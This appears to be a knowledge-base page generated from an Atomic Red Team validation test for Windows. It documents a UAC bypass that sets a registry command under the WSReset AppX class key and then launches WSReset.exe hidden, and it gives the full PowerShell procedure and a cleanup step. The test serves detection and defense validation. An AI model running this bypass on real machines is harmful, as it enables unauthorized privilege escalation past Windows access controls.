---
atomic_guid: "3b96673f-9c92-40f1-8a3e-ca060846f8d9"
title: "UAC Bypass with WSReset Registry Modification"
framework: "atomic"
generated: "true"
attack_technique_id: "T1548.002"
attack_technique_name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "3b96673f-9c92-40f1-8a3e-ca060846f8d9"
  - "UAC Bypass with WSReset Registry Modification"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# UAC Bypass with WSReset Registry Modification

The following UAC bypass is focused on a registry key under "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" that will trigger a command once wsreset.exe runs. 
This bypass is limited to Windows 10 1803/1809 and may not run on Server platforms. The registry mod is where interest will be.
If successful, the command to run will spawn off wsreset.exe. 
[UAC Bypass in Windows 10 Store Binary](https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)

## Metadata

- Atomic GUID: 3b96673f-9c92-40f1-8a3e-ca060846f8d9
- Technique: T1548.002: Abuse Elevation Control Mechanism: Bypass User Account Control
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1548.002/T1548.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1548-abuse_elevation_control_mechanism|T1548.002]]

## Input Arguments

### commandpath

- description: Registry path
- type: string
- default: HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command

### commandtorun

- description: Command to run
- type: string
- default: C:\Windows\System32\cmd.exe /c start cmd.exe

## Executor

- name: powershell

### Command

```powershell
New-Item #{commandpath} -Force | Out-Null
New-ItemProperty -Path #{commandpath} -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path #{commandpath} -Name "(default)" -Value "#{commandtorun}" -Force -ErrorAction SilentlyContinue | Out-Null
$Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
```

### Cleanup

```powershell
Remove-Item #{commandpath} -Recurse -Force
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml)
